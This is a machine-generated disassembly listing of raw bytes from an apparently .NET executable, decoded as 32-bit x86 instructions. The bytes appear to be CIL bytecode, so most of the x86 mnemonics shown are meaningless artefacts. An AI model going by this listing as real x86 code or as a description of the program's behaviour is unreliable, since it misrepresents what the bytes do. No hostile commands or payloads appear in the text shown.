  403615:	0a 16                	or     (%esi),%dl
  403617:	fe 01                	incb   (%ecx)
  403619:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40361c:	04 2c                	add    $0x2c,%al
  40361e:	09 72 63             	or     %esi,0x63(%edx)
  403621:	06                   	push   %es
  403622:	00 70 13             	add    %dh,0x13(%eax)
  403625:	05 de 2a 72 6b       	add    $0x6b722ade,%eax
  40362a:	06                   	push   %es
  40362b:	00 70 07             	add    %dh,0x7(%eax)
  40362e:	6f                   	outsl  %ds:(%esi),(%dx)
  40362f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403630:	00 00                	add    %al,(%eax)
  403632:	0a 28                	or     (%eax),%ch
  403634:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403635:	00 00                	add    %al,(%eax)
  403637:	0a 13                	or     (%ebx),%dl
  403639:	05 de 16 06 2c       	add    $0x2c0616de,%eax
  40363e:	07                   	pop    %es
  40363f:	06                   	push   %es
  403640:	6f                   	outsl  %ds:(%esi),(%dx)
  403641:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403646:	dc 26                	fsubl  (%esi)
  403648:	00 72 63             	add    %dh,0x63(%edx)
  40364b:	06                   	push   %es
  40364c:	00 70 13             	add    %dh,0x13(%eax)
  40364f:	05 de 00 11 05       	add    $0x51100de,%eax
  403654:	2a 00                	sub    (%eax),%al
  403656:	00 00                	add    %al,(%eax)
  403658:	01 28                	add    %ebp,(%eax)
  40365a:	00 00                	add    %al,(%eax)
  40365c:	02 00                	add    (%eax),%al
  40365e:	35 00 2c 61 00       	xor    $0x612c00,%eax
  403663:	0b 00                	or     (%eax),%eax
  403665:	00 00                	add    %al,(%eax)
  403667:	00 02                	add    %al,(%edx)
  403669:	00 21                	add    %ah,(%ecx)
  40366b:	00 77 98             	add    %dh,-0x68(%edi)
  40366e:	00 0b                	add    %cl,(%ebx)
  403670:	00 00                	add    %al,(%eax)
  403672:	00 00                	add    %al,(%eax)
  403674:	00 00                	add    %al,(%eax)
  403676:	01 00                	add    %eax,(%eax)
  403678:	a2 a3 00 0b 0f       	mov    %al,0xf0b00a3
  40367d:	00 00                	add    %al,(%eax)
  40367f:	01 13                	add    %edx,(%ebx)
  403681:	30 02                	xor    %al,(%edx)
  403683:	00 43 00             	add    %al,0x0(%ebx)
  403686:	00 00                	add    %al,(%eax)
  403688:	11 00                	adc    %eax,(%eax)
  40368a:	00 11                	add    %dl,(%ecx)
  40368c:	00 28                	add    %ch,(%eax)
  40368e:	a8 00                	test   $0x0,%al
  403690:	00 0a                	add    %cl,(%edx)
  403692:	0a 00                	or     (%eax),%al
  403694:	06                   	push   %es
  403695:	0b 16                	or     (%esi),%edx
  403697:	0c 2b                	or     $0x2b,%al
  403699:	27                   	daa
  40369a:	07                   	pop    %es
  40369b:	08 9a 0d 00 09 6f    	or     %bl,0x6f09000d(%edx)
  4036a1:	a9 00 00 0a 02       	test   $0x20a0000,%eax
  4036a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4036a7:	aa                   	stos   %al,%es:(%edi)
  4036a8:	00 00                	add    %al,(%eax)
  4036aa:	0a 28                	or     (%eax),%ch
  4036ac:	ab                   	stos   %eax,%es:(%edi)
  4036ad:	00 00                	add    %al,(%eax)
  4036af:	0a 13                	or     (%ebx),%dl
  4036b1:	04 11                	add    $0x11,%al
  4036b3:	04 2c                	add    $0x2c,%al
  4036b5:	06                   	push   %es
  4036b6:	00 09                	add    %cl,(%ecx)
  4036b8:	13 05 2b 10 00 08    	adc    0x800102b,%eax
  4036be:	17                   	pop    %ss
  4036bf:	58                   	pop    %eax
  4036c0:	0c 08                	or     $0x8,%al
  4036c2:	07                   	pop    %es
  4036c3:	8e 69 32             	mov    0x32(%ecx),%gs
  4036c6:	d3 14 13             	rcll   %cl,(%ebx,%edx,1)
  4036c9:	05 2b 00 11 05       	add    $0x511002b,%eax
  4036ce:	2a 00                	sub    (%eax),%al
  4036d0:	1b 30                	sbb    (%eax),%esi
  4036d2:	01 00                	add    %eax,(%eax)
  4036d4:	16                   	push   %ss
	...
  4036dd:	00 20                	add    %ah,(%eax)
  4036df:	03 00                	add    (%eax),%eax
  4036e1:	00 80 28 3d 00 00    	add    %al,0x3d28(%eax)
  4036e7:	06                   	push   %es
  4036e8:	26 00 de             	es add %bl,%dh
  4036eb:	05 26 00 00 de       	add    $0xde000026,%eax
  4036f0:	00 2a                	add    %ch,(%edx)
  4036f2:	00 00                	add    %al,(%eax)
  4036f4:	01 10                	add    %edx,(%eax)
  4036f6:	00 00                	add    %al,(%eax)
  4036f8:	00 00                	add    %al,(%eax)
  4036fa:	01 00                	add    %eax,(%eax)
  4036fc:	0f 10 00             	movups (%eax),%xmm0
  4036ff:	05 0f 00 00 01       	add    $0x100000f,%eax
  403704:	1b 30                	sbb    (%eax),%esi
  403706:	03 00                	add    (%eax),%eax
  403708:	42                   	inc    %edx
  403709:	00 00                	add    %al,(%eax)
  40370b:	00 12                	add    %dl,(%edx)
  40370d:	00 00                	add    %al,(%eax)
  40370f:	11 00                	adc    %eax,(%eax)
  403711:	00 20                	add    %ah,(%eax)
  403713:	00 01                	add    %al,(%ecx)
  403715:	00 00                	add    %al,(%eax)
  403717:	73 ac                	jae    0x4036c5
  403719:	00 00                	add    %al,(%eax)
  40371b:	0a 0a                	or     (%edx),%cl
  40371d:	28 39                	sub    %bh,(%ecx)
  40371f:	00 00                	add    %al,(%eax)
  403721:	06                   	push   %es
  403722:	0b 07                	or     (%edi),%eax
  403724:	06                   	push   %es
  403725:	20 00                	and    %al,(%eax)
  403727:	01 00                	add    %eax,(%eax)
  403729:	00 28                	add    %ch,(%eax)
  40372b:	3a 00                	cmp    (%eax),%al
  40372d:	00 06                	add    %al,(%esi)
  40372f:	16                   	push   %ss
  403730:	fe 02                	incb   (%edx)
  403732:	0c 08                	or     $0x8,%al
  403734:	2c 0a                	sub    $0xa,%al
  403736:	00 06                	add    %al,(%esi)
  403738:	6f                   	outsl  %ds:(%esi),(%dx)
  403739:	33 00                	xor    (%eax),%eax
  40373b:	00 0a                	add    %cl,(%edx)
  40373d:	0d de 10 00 de       	or     $0xde0010de,%eax
  403742:	05 26 00 00 de       	add    $0xde000026,%eax
  403747:	00 72 5b             	add    %dh,0x5b(%edx)
  40374a:	01 00                	add    %eax,(%eax)
  40374c:	70 0d                	jo     0x40375b
  40374e:	2b 00                	sub    (%eax),%eax
  403750:	09 2a                	or     %ebp,(%edx)
  403752:	00 00                	add    %al,(%eax)
  403754:	01 10                	add    %edx,(%eax)
  403756:	00 00                	add    %al,(%eax)
  403758:	00 00                	add    %al,(%eax)
  40375a:	01 00                	add    %eax,(%eax)
  40375c:	32 33                	xor    (%ebx),%dh
  40375e:	00 05 0f 00 00 01    	add    %al,0x100000f
  403764:	13 30                	adc    (%eax),%esi
  403766:	03 00                	add    (%eax),%eax
  403768:	19 00                	sbb    %eax,(%eax)
  40376a:	00 00                	add    %al,(%eax)
  40376c:	0a 00                	or     (%eax),%al
  40376e:	00 11                	add    %dl,(%ecx)
  403770:	00 16                	add    %dl,(%esi)
  403772:	7e 08                	jle    0x40377c
  403774:	00 00                	add    %al,(%eax)
  403776:	04 12                	add    $0x12,%al
  403778:	00 73 ad             	add    %dh,-0x53(%ebx)
  40377b:	00 00                	add    %al,(%eax)
  40377d:	0a 80 1f 00 00 04    	or     0x400001f(%eax),%al
  403783:	06                   	push   %es
  403784:	0b 2b                	or     (%ebx),%ebp
  403786:	00 07                	add    %al,(%edi)
  403788:	2a 00                	sub    (%eax),%al
  40378a:	00 00                	add    %al,(%eax)
  40378c:	13 30                	adc    (%eax),%esi
  40378e:	02 00                	add    (%eax),%al
  403790:	21 00                	and    %eax,(%eax)
  403792:	00 00                	add    %al,(%eax)
  403794:	02 00                	add    (%eax),%al
  403796:	00 11                	add    %dl,(%ecx)
  403798:	00 7e 1f             	add    %bh,0x1f(%esi)
  40379b:	00 00                	add    %al,(%eax)
  40379d:	04 14                	add    $0x14,%al
  40379f:	fe 03                	incb   (%ebx)
  4037a1:	0a 06                	or     (%esi),%al
  4037a3:	2c 13                	sub    $0x13,%al
  4037a5:	00 7e 1f             	add    %bh,0x1f(%esi)
  4037a8:	00 00                	add    %al,(%eax)
  4037aa:	04 6f                	add    $0x6f,%al
  4037ac:	ae                   	scas   %es:(%edi),%al
  4037ad:	00 00                	add    %al,(%eax)
  4037af:	0a 00                	or     (%eax),%al
  4037b1:	14 80                	adc    $0x80,%al
  4037b3:	1f                   	pop    %ds
  4037b4:	00 00                	add    %al,(%eax)
  4037b6:	04 00                	add    $0x0,%al
  4037b8:	2a 00                	sub    (%eax),%al
  4037ba:	00 00                	add    %al,(%eax)
  4037bc:	13 30                	adc    (%eax),%esi
  4037be:	01 00                	add    %eax,(%eax)
  4037c0:	20 00                	and    %al,(%eax)
  4037c2:	00 00                	add    %al,(%eax)
  4037c4:	02 00                	add    (%eax),%al
  4037c6:	00 11                	add    %dl,(%ecx)
  4037c8:	00 7e 0f             	add    %bh,0xf(%esi)
  4037cb:	00 00                	add    %al,(%eax)
  4037cd:	04 28                	add    $0x28,%al
  4037cf:	13 00                	adc    (%eax),%eax
  4037d1:	00 0a                	add    %cl,(%edx)
  4037d3:	2c 07                	sub    $0x7,%al
  4037d5:	28 31                	sub    %dh,(%ecx)
  4037d7:	00 00                	add    %al,(%eax)
  4037d9:	06                   	push   %es
  4037da:	2b 01                	sub    (%ecx),%eax
  4037dc:	16                   	push   %ss
  4037dd:	0a 06                	or     (%esi),%al
  4037df:	2c 06                	sub    $0x6,%al
  4037e1:	28 41 00             	sub    %al,0x0(%ecx)
  4037e4:	00 06                	add    %al,(%esi)
  4037e6:	00 2a                	add    %ch,(%edx)
  4037e8:	1b 30                	sbb    (%eax),%esi
  4037ea:	03 00                	add    (%eax),%eax
  4037ec:	2c 00                	sub    $0x0,%al
	...
  4037f6:	14 fe                	adc    $0xfe,%al
  4037f8:	06                   	push   %es
  4037f9:	3f                   	aas
  4037fa:	00 00                	add    %al,(%eax)
  4037fc:	06                   	push   %es
  4037fd:	73 af                	jae    0x4037ae
  4037ff:	00 00                	add    %al,(%eax)
  403801:	0a 28                	or     (%eax),%ch
  403803:	b0 00                	mov    $0x0,%al
  403805:	00 0a                	add    %cl,(%edx)
  403807:	00 28                	add    %ch,(%eax)
  403809:	b1 00                	mov    $0x0,%cl
  40380b:	00 0a                	add    %cl,(%edx)
  40380d:	00 17                	add    %dl,(%edi)
  40380f:	16                   	push   %ss
  403810:	16                   	push   %ss
  403811:	28 3e                	sub    %bh,(%esi)
  403813:	00 00                	add    %al,(%eax)
  403815:	06                   	push   %es
  403816:	00 00                	add    %al,(%eax)
  403818:	de 05 26 00 00 de    	fiadds 0xde000026
  40381e:	00 2a                	add    %ch,(%edx)
  403820:	01 10                	add    %edx,(%eax)
  403822:	00 00                	add    %al,(%eax)
  403824:	00 00                	add    %al,(%eax)
  403826:	01 00                	add    %eax,(%eax)
  403828:	25 26 00 05 0f       	and    $0xf050026,%eax
  40382d:	00 00                	add    %al,(%eax)
  40382f:	01 1b                	add    %ebx,(%ebx)
  403831:	30 03                	xor    %al,(%ebx)
  403833:	00 24 00             	add    %ah,(%eax,%eax,1)
  403836:	00 00                	add    %al,(%eax)
  403838:	02 00                	add    (%eax),%al
  40383a:	00 11                	add    %dl,(%ecx)
  40383c:	00 00                	add    %al,(%eax)
  40383e:	16                   	push   %ss
  40383f:	16                   	push   %ss
  403840:	16                   	push   %ss
  403841:	28 3e                	sub    %bh,(%esi)
  403843:	00 00                	add    %al,(%eax)
  403845:	06                   	push   %es
  403846:	00 00                	add    %al,(%eax)
  403848:	de 15 26 00 2b 0d    	ficoms 0xd2b0026
  40384e:	00 20                	add    %ah,(%eax)
  403850:	a0 86 01 00 28       	mov    0x28000186,%al
  403855:	10 00                	adc    %al,(%eax)
  403857:	00 0a                	add    %cl,(%edx)
  403859:	00 00                	add    %al,(%eax)
  40385b:	17                   	pop    %ss
  40385c:	0a 2b                	or     (%ebx),%ch
  40385e:	ef                   	out    %eax,(%dx)
  40385f:	2a 01                	sub    (%ecx),%al
  403861:	10 00                	adc    %al,(%eax)
  403863:	00 00                	add    %al,(%eax)
  403865:	00 01                	add    %al,(%ecx)
  403867:	00 0d 0e 00 15 0f    	add    %cl,0xf15000e
  40386d:	00 00                	add    %al,(%eax)
  40386f:	01 1b                	add    %ebx,(%ebx)
  403871:	30 04 00             	xor    %al,(%eax,%eax,1)
  403874:	44                   	inc    %esp
  403875:	00 00                	add    %al,(%eax)
  403877:	00 14 00             	add    %dl,(%eax,%eax,1)
  40387a:	00 11                	add    %dl,(%ecx)
  40387c:	00 00                	add    %al,(%eax)
  40387e:	7e 66                	jle    0x4038e6
  403880:	00 00                	add    %al,(%eax)
  403882:	0a 7e 20             	or     0x20(%esi),%bh
  403885:	00 00                	add    %al,(%eax)
  403887:	04 18                	add    $0x18,%al
  403889:	6f                   	outsl  %ds:(%esi),(%dx)
  40388a:	b2 00                	mov    $0x0,%dl
  40388c:	00 0a                	add    %cl,(%edx)
  40388e:	0a 00                	or     (%eax),%al
  403890:	06                   	push   %es
  403891:	02 03                	add    (%ebx),%al
  403893:	19 6f b3             	sbb    %ebp,-0x4d(%edi)
  403896:	00 00                	add    %al,(%eax)
  403898:	0a 00                	or     (%eax),%al
  40389a:	17                   	pop    %ss
  40389b:	0b de                	or     %esi,%ebx
  40389d:	20 06                	and    %al,(%esi)
  40389f:	2c 07                	sub    $0x7,%al
  4038a1:	06                   	push   %es
  4038a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4038a3:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4038a8:	dc 0c 00             	fmull  (%eax,%eax,1)
  4038ab:	08 6f 76             	or     %ch,0x76(%edi)
  4038ae:	00 00                	add    %al,(%eax)
  4038b0:	0a 28                	or     (%eax),%ch
  4038b2:	4a                   	dec    %edx
  4038b3:	00 00                	add    %al,(%eax)
  4038b5:	06                   	push   %es
  4038b6:	00 00                	add    %al,(%eax)
  4038b8:	de 00                	fiadds (%eax)
  4038ba:	16                   	push   %ss
  4038bb:	0b 2b                	or     (%ebx),%ebp
  4038bd:	00 07                	add    %al,(%edi)
  4038bf:	2a 01                	sub    (%ecx),%al
  4038c1:	1c 00                	sbb    $0x0,%al
  4038c3:	00 02                	add    %al,(%edx)
  4038c5:	00 13                	add    %dl,(%ebx)
  4038c7:	00 0f                	add    %cl,(%edi)
  4038c9:	22 00                	and    (%eax),%al
  4038cb:	0b 00                	or     (%eax),%eax
  4038cd:	00 00                	add    %al,(%eax)
  4038cf:	00 00                	add    %al,(%eax)
  4038d1:	00 01                	add    %al,(%ecx)
  4038d3:	00 2c 2d 00 11 12 00 	add    %ch,0x121100(,%ebp,1)
  4038da:	00 01                	add    %al,(%ecx)
  4038dc:	1b 30                	sbb    (%eax),%esi
  4038de:	02 00                	add    (%eax),%al
  4038e0:	46                   	inc    %esi
  4038e1:	00 00                	add    %al,(%eax)
  4038e3:	00 15 00 00 11 00    	add    %dl,0x110000
  4038e9:	00 7e 66             	add    %bh,0x66(%esi)
  4038ec:	00 00                	add    %al,(%eax)
  4038ee:	0a 7e 20             	or     0x20(%esi),%bh
  4038f1:	00 00                	add    %al,(%eax)
  4038f3:	04 6f                	add    $0x6f,%al
  4038f5:	b4 00                	mov    $0x0,%ah
  4038f7:	00 0a                	add    %cl,(%edx)
  4038f9:	0a 00                	or     (%eax),%al
  4038fb:	06                   	push   %es
  4038fc:	02 6f b5             	add    -0x4b(%edi),%ch
  4038ff:	00 00                	add    %al,(%eax)
  403901:	0a 0b                	or     (%ebx),%cl
  403903:	07                   	pop    %es
  403904:	74 02                	je     0x403908
  403906:	00 00                	add    %al,(%eax)
  403908:	1b 0c de             	sbb    (%esi,%ebx,8),%ecx
  40390b:	20 06                	and    %al,(%esi)
  40390d:	2c 07                	sub    $0x7,%al
  40390f:	06                   	push   %es
  403910:	6f                   	outsl  %ds:(%esi),(%dx)
  403911:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403916:	dc 0d 00 09 6f 76    	fmull  0x766f0900
  40391c:	00 00                	add    %al,(%eax)
  40391e:	0a 28                	or     (%eax),%ch
  403920:	4a                   	dec    %edx
  403921:	00 00                	add    %al,(%eax)
  403923:	06                   	push   %es
  403924:	00 00                	add    %al,(%eax)
  403926:	de 00                	fiadds (%eax)
  403928:	14 0c                	adc    $0xc,%al
  40392a:	2b 00                	sub    (%eax),%eax
  40392c:	08 2a                	or     %ch,(%edx)
  40392e:	00 00                	add    %al,(%eax)
  403930:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403933:	00 02                	add    %al,(%edx)
  403935:	00 12                	add    %dl,(%edx)
  403937:	00 12                	add    %dl,(%edx)
  403939:	24 00                	and    $0x0,%al
  40393b:	0b 00                	or     (%eax),%eax
  40393d:	00 00                	add    %al,(%eax)
  40393f:	00 00                	add    %al,(%eax)
  403941:	00 01                	add    %al,(%ecx)
  403943:	00 2e                	add    %ch,(%esi)
  403945:	2f                   	das
  403946:	00 11                	add    %dl,(%ecx)
  403948:	12 00                	adc    (%eax),%al
  40394a:	00 01                	add    %al,(%ecx)
  40394c:	1b 30                	sbb    (%eax),%esi
  40394e:	02 00                	add    (%eax),%al
  403950:	41                   	inc    %ecx
  403951:	00 00                	add    %al,(%eax)
  403953:	00 14 00             	add    %dl,(%eax,%eax,1)
  403956:	00 11                	add    %dl,(%ecx)
  403958:	00 00                	add    %al,(%eax)
  40395a:	7e 66                	jle    0x4039c2
  40395c:	00 00                	add    %al,(%eax)
  40395e:	0a 7e 20             	or     0x20(%esi),%bh
  403961:	00 00                	add    %al,(%eax)
  403963:	04 6f                	add    $0x6f,%al
  403965:	b4 00                	mov    $0x0,%ah
  403967:	00 0a                	add    %cl,(%edx)
  403969:	0a 00                	or     (%eax),%al
  40396b:	06                   	push   %es
  40396c:	02 6f b6             	add    -0x4a(%edi),%ch
  40396f:	00 00                	add    %al,(%eax)
  403971:	0a 00                	or     (%eax),%al
  403973:	17                   	pop    %ss
  403974:	0b de                	or     %esi,%ebx
  403976:	20 06                	and    %al,(%esi)
  403978:	2c 07                	sub    $0x7,%al
  40397a:	06                   	push   %es
  40397b:	6f                   	outsl  %ds:(%esi),(%dx)
  40397c:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403981:	dc 0c 00             	fmull  (%eax,%eax,1)
  403984:	08 6f 76             	or     %ch,0x76(%edi)
  403987:	00 00                	add    %al,(%eax)
  403989:	0a 28                	or     (%eax),%ch
  40398b:	4a                   	dec    %edx
  40398c:	00 00                	add    %al,(%eax)
  40398e:	06                   	push   %es
  40398f:	00 00                	add    %al,(%eax)
  403991:	de 00                	fiadds (%eax)
  403993:	16                   	push   %ss
  403994:	0b 2b                	or     (%ebx),%ebp
  403996:	00 07                	add    %al,(%edi)
  403998:	2a 00                	sub    (%eax),%al
  40399a:	00 00                	add    %al,(%eax)
  40399c:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  40399f:	00 02                	add    %al,(%edx)
  4039a1:	00 12                	add    %dl,(%edx)
  4039a3:	00 0d 1f 00 0b 00    	add    %cl,0xb001f
  4039a9:	00 00                	add    %al,(%eax)
  4039ab:	00 00                	add    %al,(%eax)
  4039ad:	00 01                	add    %al,(%ecx)
  4039af:	00 29                	add    %ch,(%ecx)
  4039b1:	2a 00                	sub    (%eax),%al
  4039b3:	11 12                	adc    %edx,(%edx)
  4039b5:	00 00                	add    %al,(%eax)
  4039b7:	01 1b                	add    %ebx,(%ebx)
  4039b9:	30 03                	xor    %al,(%ebx)
  4039bb:	00 46 00             	add    %al,0x0(%esi)
  4039be:	00 00                	add    %al,(%eax)
  4039c0:	14 00                	adc    $0x0,%al
  4039c2:	00 11                	add    %dl,(%ecx)
  4039c4:	00 00                	add    %al,(%eax)
  4039c6:	7e 66                	jle    0x403a2e
  4039c8:	00 00                	add    %al,(%eax)
  4039ca:	0a 72 5b             	or     0x5b(%edx),%dh
  4039cd:	01 00                	add    %eax,(%eax)
  4039cf:	70 17                	jo     0x4039e8
  4039d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d2:	b7 00                	mov    $0x0,%bh
  4039d4:	00 0a                	add    %cl,(%edx)
  4039d6:	0a 00                	or     (%eax),%al
  4039d8:	06                   	push   %es
  4039d9:	7e 20                	jle    0x4039fb
  4039db:	00 00                	add    %al,(%eax)
  4039dd:	04 6f                	add    $0x6f,%al
  4039df:	b8 00 00 0a 00       	mov    $0xa0000,%eax
  4039e4:	17                   	pop    %ss
  4039e5:	0b de                	or     %esi,%ebx
  4039e7:	20 06                	and    %al,(%esi)
  4039e9:	2c 07                	sub    $0x7,%al
  4039eb:	06                   	push   %es
  4039ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4039ed:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4039f2:	dc 0c 00             	fmull  (%eax,%eax,1)
  4039f5:	08 6f 76             	or     %ch,0x76(%edi)
  4039f8:	00 00                	add    %al,(%eax)
  4039fa:	0a 28                	or     (%eax),%ch
  4039fc:	4a                   	dec    %edx
  4039fd:	00 00                	add    %al,(%eax)
  4039ff:	06                   	push   %es
  403a00:	00 00                	add    %al,(%eax)
  403a02:	de 00                	fiadds (%eax)
  403a04:	16                   	push   %ss
  403a05:	0b 2b                	or     (%ebx),%ebp
  403a07:	00 07                	add    %al,(%edi)
  403a09:	2a 00                	sub    (%eax),%al
  403a0b:	00 01                	add    %al,(%ecx)
  403a0d:	1c 00                	sbb    $0x0,%al
  403a0f:	00 02                	add    %al,(%edx)
  403a11:	00 13                	add    %dl,(%ebx)
  403a13:	00 11                	add    %dl,(%ecx)
  403a15:	24 00                	and    $0x0,%al
  403a17:	0b 00                	or     (%eax),%eax
  403a19:	00 00                	add    %al,(%eax)
  403a1b:	00 00                	add    %al,(%eax)
  403a1d:	00 01                	add    %al,(%ecx)
  403a1f:	00 2e                	add    %ch,(%esi)
  403a21:	2f                   	das
  403a22:	00 11                	add    %dl,(%ecx)
  403a24:	12 00                	adc    (%eax),%al
  403a26:	00 01                	add    %al,(%ecx)
  403a28:	56                   	push   %esi
  403a29:	72 71                	jb     0x403a9c
  403a2b:	06                   	push   %es
  403a2c:	00 70 7e             	add    %dh,0x7e(%eax)
  403a2f:	10 00                	adc    %al,(%eax)
  403a31:	00 04 28             	add    %al,(%eax,%ebp,1)
  403a34:	6f                   	outsl  %ds:(%esi),(%dx)
  403a35:	00 00                	add    %al,(%eax)
  403a37:	0a 80 20 00 00 04    	or     0x4000020(%eax),%al
  403a3d:	2a 00                	sub    (%eax),%al
  403a3f:	00 1b                	add    %bl,(%ebx)
  403a41:	30 03                	xor    %al,(%ebx)
  403a43:	00 10                	add    %dl,(%eax)
  403a45:	02 00                	add    (%eax),%al
  403a47:	00 16                	add    %dl,(%esi)
  403a49:	00 00                	add    %al,(%eax)
  403a4b:	11 00                	adc    %eax,(%eax)
  403a4d:	00 73 4d             	add    %dh,0x4d(%ebx)
  403a50:	00 00                	add    %al,(%eax)
  403a52:	0a 0a                	or     (%edx),%cl
  403a54:	06                   	push   %es
  403a55:	02 74 02 00          	add    0x0(%edx,%eax,1),%dh
  403a59:	00 1b                	add    %bl,(%ebx)
  403a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  403a5c:	b9 00 00 0a 00       	mov    $0xa0000,%ecx
  403a61:	06                   	push   %es
  403a62:	72 f1                	jb     0x403a55
  403a64:	01 00                	add    %eax,(%eax)
  403a66:	70 6f                	jo     0x403ad7
  403a68:	4e                   	dec    %esi
  403a69:	00 00                	add    %al,(%eax)
  403a6b:	0a 6f ba             	or     -0x46(%edi),%ch
  403a6e:	00 00                	add    %al,(%eax)
  403a70:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403a73:	0b 07                	or     (%edi),%eax
  403a75:	72 85                	jb     0x4039fc
  403a77:	06                   	push   %es
  403a78:	00 70 28             	add    %dh,0x28(%eax)
  403a7b:	1f                   	pop    %ds
  403a7c:	00 00                	add    %al,(%eax)
  403a7e:	0a 2d 22 07 72 8f    	or     0x8f720722,%ch
  403a84:	06                   	push   %es
  403a85:	00 70 28             	add    %dh,0x28(%eax)
  403a88:	1f                   	pop    %ds
  403a89:	00 00                	add    %al,(%eax)
  403a8b:	0a 2d 68 07 72 9d    	or     0x9d720768,%ch
  403a91:	06                   	push   %es
  403a92:	00 70 28             	add    %dh,0x28(%eax)
  403a95:	1f                   	pop    %ds
  403a96:	00 00                	add    %al,(%eax)
  403a98:	0a 3a                	or     (%edx),%bh
  403a9a:	f7 00 00 00 38 a2    	testl  $0xa2380000,(%eax)
  403aa0:	01 00                	add    %eax,(%eax)
  403aa2:	00 00                	add    %al,(%eax)
  403aa4:	16                   	push   %ss
  403aa5:	28 1a                	sub    %bl,(%edx)
  403aa7:	00 00                	add    %al,(%eax)
  403aa9:	06                   	push   %es
  403aaa:	00 73 4d             	add    %dh,0x4d(%ebx)
  403aad:	00 00                	add    %al,(%eax)
  403aaf:	0a 0d 09 72 f1 01    	or     0x1f17209,%cl
  403ab5:	00 70 6f             	add    %dh,0x6f(%eax)
  403ab8:	4e                   	dec    %esi
  403ab9:	00 00                	add    %al,(%eax)
  403abb:	0a 72 85             	or     -0x7b(%edx),%dh
  403abe:	06                   	push   %es
  403abf:	00 70 6f             	add    %dh,0x6f(%eax)
  403ac2:	bb 00 00 0a 00       	mov    $0xa0000,%ebx
  403ac7:	09 72 09             	or     %esi,0x9(%edx)
  403aca:	02 00                	add    (%eax),%al
  403acc:	70 6f                	jo     0x403b3d
  403ace:	4e                   	dec    %esi
  403acf:	00 00                	add    %al,(%eax)
  403ad1:	0a 28                	or     (%eax),%ch
  403ad3:	17                   	pop    %ss
  403ad4:	00 00                	add    %al,(%eax)
  403ad6:	06                   	push   %es
  403ad7:	6a 6f                	push   $0x6f
  403ad9:	bc 00 00 0a 00       	mov    $0xa0000,%esp
  403ade:	09 6f 51             	or     %ebp,0x51(%edi)
  403ae1:	00 00                	add    %al,(%eax)
  403ae3:	0a 28                	or     (%eax),%ch
  403ae5:	21 00                	and    %eax,(%eax)
  403ae7:	00 06                	add    %al,(%esi)
  403ae9:	00 16                	add    %dl,(%esi)
  403aeb:	28 18                	sub    %bl,(%eax)
  403aed:	00 00                	add    %al,(%eax)
  403aef:	06                   	push   %es
  403af0:	00 38                	add    %bh,(%eax)
  403af2:	4f                   	dec    %edi
  403af3:	01 00                	add    %eax,(%eax)
  403af5:	00 00                	add    %al,(%eax)
  403af7:	00 06                	add    %al,(%esi)
  403af9:	72 b3                	jb     0x403aae
  403afb:	06                   	push   %es
  403afc:	00 70 6f             	add    %dh,0x6f(%eax)
  403aff:	4e                   	dec    %esi
  403b00:	00 00                	add    %al,(%eax)
  403b02:	0a 6f ba             	or     -0x46(%edi),%ch
  403b05:	00 00                	add    %al,(%eax)
  403b07:	0a 28                	or     (%eax),%ch
  403b09:	43                   	inc    %ebx
  403b0a:	00 00                	add    %al,(%eax)
  403b0c:	06                   	push   %es
  403b0d:	14 fe                	adc    $0xfe,%al
  403b0f:	01 13                	add    %edx,(%ebx)
  403b11:	04 11                	add    $0x11,%al
  403b13:	04 2c                	add    $0x2c,%al
  403b15:	5d                   	pop    %ebp
  403b16:	00 7e 21             	add    %bh,0x21(%esi)
  403b19:	00 00                	add    %al,(%eax)
  403b1b:	04 06                	add    $0x6,%al
  403b1d:	6f                   	outsl  %ds:(%esi),(%dx)
  403b1e:	bd 00 00 0a 00       	mov    $0xa0000,%ebp
  403b23:	73 4d                	jae    0x403b72
  403b25:	00 00                	add    %al,(%eax)
  403b27:	0a 13                	or     (%ebx),%dl
  403b29:	05 11 05 72 f1       	add    $0xf1720511,%eax
  403b2e:	01 00                	add    %eax,(%eax)
  403b30:	70 6f                	jo     0x403ba1
  403b32:	4e                   	dec    %esi
  403b33:	00 00                	add    %al,(%eax)
  403b35:	0a 72 bb             	or     -0x45(%edx),%dh
  403b38:	06                   	push   %es
  403b39:	00 70 6f             	add    %dh,0x6f(%eax)
  403b3c:	bb 00 00 0a 00       	mov    $0xa0000,%ebx
  403b41:	11 05 72 d1 06 00    	adc    %eax,0x6d172
  403b47:	70 6f                	jo     0x403bb8
  403b49:	4e                   	dec    %esi
  403b4a:	00 00                	add    %al,(%eax)
  403b4c:	0a 06                	or     (%esi),%al
  403b4e:	72 b3                	jb     0x403b03
  403b50:	06                   	push   %es
  403b51:	00 70 6f             	add    %dh,0x6f(%eax)
  403b54:	4e                   	dec    %esi
  403b55:	00 00                	add    %al,(%eax)
  403b57:	0a 6f ba             	or     -0x46(%edi),%ch
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	0a 6f bb             	or     -0x45(%edi),%ch
  403b5f:	00 00                	add    %al,(%eax)
  403b61:	0a 00                	or     (%eax),%al
  403b63:	11 05 6f 51 00 00    	adc    %eax,0x516f
  403b69:	0a 28                	or     (%eax),%ch
  403b6b:	21 00                	and    %eax,(%eax)
  403b6d:	00 06                	add    %al,(%esi)
  403b6f:	00 00                	add    %al,(%eax)
  403b71:	2b 07                	sub    (%edi),%eax
  403b73:	06                   	push   %es
  403b74:	28 48 00             	sub    %cl,0x0(%eax)
  403b77:	00 06                	add    %al,(%esi)
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	de 13                	ficoms (%ebx)
  403b7d:	13 06                	adc    (%esi),%eax
  403b7f:	00 11                	add    %dl,(%ecx)
  403b81:	06                   	push   %es
  403b82:	6f                   	outsl  %ds:(%esi),(%dx)
  403b83:	76 00                	jbe    0x403b85
  403b85:	00 0a                	add    %cl,(%edx)
  403b87:	28 4a 00             	sub    %cl,0x0(%edx)
